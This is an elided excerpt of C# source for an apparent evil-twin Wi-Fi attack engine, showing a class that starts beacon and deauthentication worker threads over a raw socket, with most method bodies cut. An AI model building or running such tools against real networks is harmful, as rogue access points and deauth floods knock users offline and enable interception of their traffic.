...
namespace HackItWireless
{
    public class EviltwinEngineV3
    {
        ...
        private CancellationTokenSource _deauthCts;
        ...
        public EviltwinEngineV3(string iface, string ssid, string bssid, int channel)
        {
            _iface = iface;
            _ssid = ssid;
        ...
        public void Start()
        {
            ...
            Task.Run(() => BeaconWorker(_cts.Token));
        }
        ...
        public void StartDeauth()
        {
            ...
            _deauthRunning = true;
            _deauthCts = new CancellationTokenSource();
            Task.Run(() => DeauthWorker(_deauthCts.Token));
        }
        ...
        private void BeaconWorker(CancellationToken ct)
        {
            ...
            try
            {
                ...
                {
                    for (int i = 0; i < 64 && !ct.IsCancellationRequested && _running; i++)
                    {
        ...
        private void DeauthWorker(CancellationToken ct)
        {
            int fd = RawSocketOpen(_iface);
            ...
            try
            {
                while (!ct.IsCancellationRequested && _deauthRunning)
                {
